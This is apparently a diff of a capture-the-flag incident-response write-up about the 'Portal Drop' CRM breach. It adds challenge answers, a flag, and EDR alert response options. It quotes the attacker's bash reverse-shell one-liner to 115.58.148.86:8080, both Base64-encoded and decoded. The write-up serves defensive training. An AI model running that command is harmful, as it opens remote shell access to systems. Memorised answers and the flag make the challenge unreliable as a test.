@@ -1,4 +1,4 @@
-<img width="1162" height="329" alt="image" src="https://github.com/user-attachments/assets/12ff9432-fc93-4930-ab6f-137cc1171368" />Portal Drop
+Portal Drop
 
 You are on the day shift in the ProbablyFine when the monitoring dashboard flashes red. A new alert appears in the WAF summary, reporting a web scan on crm.trypatchme.thm followed by a suspicious file upload anomaly. The affected website is TryPatchMe's public-facing CRM portal, a valued customer who provides software patching consulting services.
 
@@ -103,37 +103,98 @@ The attacker achieved persistence by uploading a malicious PHP file (invoice.php
 
 Which process image executes attacker commands received from the web?
 
+<img width="907" height="607" alt="image" src="https://github.com/user-attachments/assets/3fd20c12-601b-4b53-8e23-8b286a67af0c" />
 
-bash -i >& /dev/tcp/115.58.148.86/8080 0>&1
+`Answer: /usr/sbin/php-fpm7.4`
 
 ---
 
 What command allowed the attacker to open a bash reverse shell?
 
+<img width="1908" height="617" alt="image" src="https://github.com/user-attachments/assets/87457bbf-9cfc-457e-b844-a1f09e925b44" />
+
+Use cyberchef to decode. 
+
+WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1UVXVOVGd1TVRRNExqZzJMemd3T0RBZ01ENG1NUT09
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuNTguMTQ4Ljg2LzgwODAgMD4mMQ==
+bash -i >& /dev/tcp/115.58.148.86/8080 0>&1
+
+<img width="1148" height="468" alt="image" src="https://github.com/user-attachments/assets/2331d6ee-8c10-4d28-840a-1596f5048976" />
+
+The attacker decoded and executed a Base64-encoded command that launched a Bash reverse shell connecting back to 115.58.148.86:8080.
+
+`Answer: bash -i >& /dev/tcp/115.58.148.86/8080 0>&1`
 
 ---
 
 Which Linux user executes the entered malicious commands?
 
+<img width="1805" height="690" alt="image" src="https://github.com/user-attachments/assets/b8b52636-4435-46b0-b912-07a6189f4190" />
+
+`Answer: www-data`
 
 ---
 
 What sensitive CRM configuration file did the attacker access? 
+
+<img width="1495" height="688" alt="image" src="https://github.com/user-attachments/assets/c0be4f9b-04bb-4538-a6d5-b4e3cd93ca16" />
+
+`Answer:  /etc/trycrm/config.json`
 
 
 ---
 
 Which domain was used to exfiltrate the CRM portal database?
 
+<img width="1505" height="722" alt="image" src="https://github.com/user-attachments/assets/4128f2b4-9265-49ee-89fc-10b633d67b48" />
+
+`Answer:  portaldrop2025.xyz`
 
 ---
 
 What flag do you get after completing all 12 EDR response actions?
 
+```
+Hands-On-Keyboard Root Activity
+Summary:
+The system experiences a spike of interactive actions originating from root. The activity pattern and time deviate from the baseline. Review the process tree for details.
 
+Actions/Response
+- Close as FP if Actions Approved
+- Contact the User Behind the Login
+- Review Changes to Nginx Config
+```
 
+```
+Unusual User Behavior: System Discovery
+Summary:
+The www-data user within the non-interactive session performs extensive system discovery. The behavior and launched commands are atypical for the user.
 
+Actions/Response
+- Block Flagged Domain/IP
+- Analyze the Root Cause
+- Isolate the Host for DFIR
+```
 
+```
+Parent-Child Anomaly: Shell Spawn
+Summary:
+A trusted php-fpm (worker) process unexpectedly spawned /bin/bash command shell with suspicious arguments. The behavior is unusual for that specific process and might indicate a breach.
 
+Actions/Response
+- Block Flagged IPv4
+- Terminate Bash Process
+```
 
+```
+Suspicious File Write: Backdoor:PHP/Generic
+Summary:
+A suspicious file write was detected in the application uploads directory. The file was written by php-fpm (worker, www-data) under apache2.
 
+Actions/Response
+- Quarantine invoice.php File
+- Analyze the Root Cause
+- Collect invoice.php File
+```
+
+`Answer:  THM{p0rtal_dropp3d?}`
